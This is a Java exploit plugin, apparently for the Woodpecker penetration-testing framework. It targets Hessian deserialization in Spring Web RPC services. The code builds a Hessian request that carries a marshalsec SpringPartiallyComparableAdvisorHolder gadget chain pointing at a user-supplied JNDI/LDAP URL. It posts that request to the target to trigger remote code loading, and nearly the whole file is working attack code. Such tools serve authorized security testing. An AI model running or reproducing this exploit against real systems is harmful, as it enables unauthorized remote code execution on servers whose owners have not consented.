package plugins.vul.spring.web;

import me.gv7.woodpecker.marshalsec.Hessian;
import me.gv7.woodpecker.marshalsec.Hessian2;
import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.requests.Header;
import me.gv7.woodpecker.requests.Requests;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.Map;

public class SpringWebRPC_HessianDeserialize_Exploit implements IExploit {
    private IPluginHelper helper;

    public SpringWebRPC_HessianDeserialize_Exploit() {
        helper = SpringWebRPC_HessianDeserialize_Plugin.pluginHelper;
    }

    @Override
    public String getExploitTabCaption() {
        return "JNDI";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        IArgsUsageBinder usageBinder = helper.createArgsUsageBinder();

        IArg jndiUrl = helper.createArg();
        jndiUrl.setName("jndi-url");
        jndiUrl.setRequired(true);
        jndiUrl.setDefaultValue("ldap://127.0.0.1:1389/a");
        jndiUrl.setDescription("jndi exploit url");

        IArg hessianVersion = helper.createArg();
        hessianVersion.setName("hessian-version");
        hessianVersion.setRequired(true);
        hessianVersion.setDefaultValue("2");
        hessianVersion.setEnumValue(Arrays.asList(new String[]{"1","2"}));
        hessianVersion.setDescription("hessian protocol version");

        usageBinder.setArgsList(Arrays.asList(jndiUrl,hessianVersion));

        return usageBinder;
    }

    @Override
    public void doExploit(ITarget iTarget, Map<String, Object> map, IResultOutput iResultOutput) throws Throwable {
        String jndiUrl = (String) map.get("jndi-url");
        String version = (String) map.get("hessian-version");
        String target = iTarget.getAddress();

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        // Hessian RPC协议
        bos.write(99);// H
        bos.write(2);// major
        bos.write(0);// minor
        // com.caucho.hessian.io.HessianInput.skipOptionalCall
        bos.write(99);
        bos.write(new byte[]{0,0});
        // com.caucho.hessian.io.AbstractHessianInput.readHeader
        bos.write(72);
        bos.write(0);
        bos.write(0);
        byte[] evilBytes = null;
        if (version.equals("1")){
            evilBytes = new Hessian().apiRun(
                    "SpringPartiallyComparableAdvisorHolder",
                    new String[]{jndiUrl}
            );
        }else {
            evilBytes = new Hessian2().apiRun(
                    "SpringPartiallyComparableAdvisorHolder",
                    new String[]{jndiUrl}
            );
        }
        bos.write(evilBytes);
        bos.flush();
        bos.close();
        Requests.post(target)
                .headers(new Header("Content-Type","application/hessian"))
                .body(bos.toByteArray())
                .send();
        iResultOutput.successPrintln("发送成功");
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
}
